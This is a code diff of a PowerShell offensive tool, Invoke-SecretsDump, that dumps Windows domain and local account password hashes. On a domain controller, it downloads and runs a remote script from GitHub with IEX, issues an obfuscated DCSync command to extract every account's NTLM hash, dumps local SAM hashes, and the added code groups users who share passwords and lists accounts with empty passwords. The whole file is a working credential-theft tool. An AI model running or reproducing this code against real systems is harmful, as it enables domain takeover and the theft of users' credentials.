@@ -1,27 +1,44 @@
 Function Invoke-SecretsDump {
     param (
-    [string]$Domain = $env:USERDNSDOMAIN,
-    [switch]$NoComputerHashes
-)
+        [string]$Domain = $env:USERDNSDOMAIN,
+        [switch]$NoComputerHashes
+    )
 
-$DomainControllerCheck = Get-WmiObject "Win32_ComputerSystem" | Select-Object -Expand "DomainRole"
-if ($DomainControllerCheck -ne "5"){return "NotDomainController"}
-
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
-
-$Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
-$output = Invoke-Pandemonium -Command $Command
-
-$lines = $output -split '\r?\n'
-
-$Data = $lines | ForEach-Object {
-    $columns = $_ -split "`t"
-    $user = $columns[1]
-    $hash = $columns[2]
-    if ($user -and $hash) {
-        "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
+    # Check if the system is a Domain Controller
+    $DomainControllerCheck = Get-WmiObject "Win32_ComputerSystem" | Select-Object -ExpandProperty "DomainRole"
+    if ($DomainControllerCheck -ne "5") {
+        return "NotDomainController"
     }
-}
+
+    # Download and execute Invoke-Pandemonium script
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
+
+    # Define the LSA dump command
+    $Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
+    $output = Invoke-Pandemonium -Command $Command
+
+    # Split the output into lines
+    $lines = $output -split '\r?\n'
+
+    $Data = @()
+    $userHashes = @{}
+    $emptyPasswordUsers = @()
+
+    # Process each line of the output
+    foreach ($line in $lines) {
+        $columns = $line -split "`t"
+        $user = $columns[1]
+        $hash = $columns[2]
+
+        if ($user -and $hash) {
+            $Data += "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
+            $userHashes[$hash] += @($user)
+
+            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
+                $emptyPasswordUsers += $user
+            }
+        }
+    }
 
 Write-Output ""
 Write-Output "[*] Dumping local SAM hashes (uid:lmhash:nthash)"
@@ -38,26 +55,52 @@ function bitshift($x, $c){return [math]::Floor($x * [math]::Pow(2, $c))}
 $users=IAS -Process {GNLPH};$excludedUsernames=@("Guest","DefaultAccount","WDAGUtilityAccount");foreach($user in $users){if($user.Username-notin$excludedUsernames){$output="$($user.Username):$($user.RID):aad3b435b51404eeaad3b435b51404ee:$($user.NTLM.ToLower()):::";$Output}}}
 DumpSAM
 
-Write-Output ""
-Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"
+    Write-Output ""
+    Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"
 
-
-
-$Data | ForEach-Object {
-    if ($_ -notlike "*$*") {
-        Write-Output $_
-    }
-}
-
-Write-Output ""
-
-if (!$NoComputerHashes) {
-    Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
+    # Output user hashes
     $Data | ForEach-Object {
-        if ($_ -like "*$*") {
+        if ($_ -notlike "*$*") {
             Write-Output $_
-            
+        }
+    }
+
+    Write-Output ""
+
+    if (!$NoComputerHashes) {
+        Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
+
+        # Output computer hashes
+        $Data | ForEach-Object {
+            if ($_ -like "*$*") {
+                Write-Output $_
             }
         }
     }
+
+    Write-Output ""
+    Write-Output "[*] Grouping Users with Identical Passwords"
+    $groupNumber = 1
+
+    # Group users with identical hashes
+    foreach ($hash in $userHashes.Keys) {
+        if ($userHashes[$hash].Count -gt 1) {
+            Write-Output ""
+            Write-Output "[Group $groupNumber]"
+
+            foreach ($user in $userHashes[$hash]) {
+                Write-Output "$user"
+            }
+
+            $groupNumber++
+        }
+    }
+
+    if ($emptyPasswordUsers.Count -gt 0) {
+        Write-Output ""
+        Write-Output "[*] Users with Empty Passwords"
+        $emptyPasswordUsers | ForEach-Object { Write-Output $_ }
+    }
 }
+
+Invoke-SecretsDump
